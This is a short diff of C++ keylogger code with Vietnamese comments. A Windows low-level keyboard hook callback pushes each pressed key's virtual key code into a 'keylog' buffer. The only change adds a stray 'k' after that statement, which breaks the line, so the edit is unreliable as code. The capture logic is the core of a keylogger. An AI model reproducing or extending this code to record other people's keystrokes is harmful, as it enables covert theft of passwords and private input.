@@ -18,7 +18,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
 
 		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
-		keylog.push_back(pkbhs->vkCode);
+		keylog.push_back(pkbhs->vkCode);k
 	}
 
 	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
